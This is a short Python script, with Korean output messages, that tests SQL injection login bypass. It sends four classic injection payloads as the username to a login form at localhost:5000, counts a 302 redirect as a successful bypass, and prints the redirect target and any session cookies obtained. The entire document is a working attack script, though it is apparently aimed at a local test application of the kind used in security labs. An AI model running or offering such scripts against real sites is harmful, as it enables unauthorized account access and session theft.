import requests

target_url = "http://localhost:5000/login"

payloads = [
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"username": "admin'--", "password": "anything"},
    {"username": "' OR 1=1--", "password": "anything"},
    {"username": "admin' OR 1=1#", "password": "anything"},
]

print("SQL Injection 로그인 우회 테스트\n")

for i, payload in enumerate(payloads, 1):
    print(f"테스트 {i}: {payload['username']}")
    
    response = requests.post(target_url, data=payload, allow_redirects=False)
    
    if response.status_code == 302:
        print(f"  상태: {response.status_code} - 로그인 우회됨")
        print(f"  리다이렉트: {response.headers.get('Location')}")
        if response.cookies:
            print(f"  쿠키: {dict(response.cookies)}")
    else:
        print(f"  상태: {response.status_code} - 실패")
    print()